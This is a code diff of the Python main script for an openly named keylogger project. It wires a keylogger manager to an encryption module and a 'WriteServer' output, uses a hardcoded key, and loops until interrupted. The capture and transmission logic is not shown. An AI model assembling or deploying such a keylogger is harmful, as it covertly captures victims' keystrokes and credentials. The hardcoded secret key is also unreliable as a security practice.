@@ -1,15 +1,21 @@
-from the_keylogger_service import KeyLoggerService
-from keyloggermanager import KeyLoggerManager
+import time
 from encryption import Encryption
-from writeServer import WriteServer
+from writeserver import WriteServer
 from keyloggermanager import KeyLoggerManager
 
 
-keylogger = KeyLoggerService()
+if __name__ == "__main__":
+    key = "my-secret-key"
 
-data = keylogger.start_logging()
+    encryption = Encryption()
+    writer = WriteServer()
+    manager = KeyLoggerManager(encryption, writer, key)
 
-data_dest = WriteServer()
+    manager.start()
 
-manager = KeyLoggerManager(data_dest, data)
-
+    try:
+        while True:
+            time.sleep(1)  # משאיר את התוכנית פעילה
+    except KeyboardInterrupt:
+        manager.stop()
+        print("Stopped gracefully")
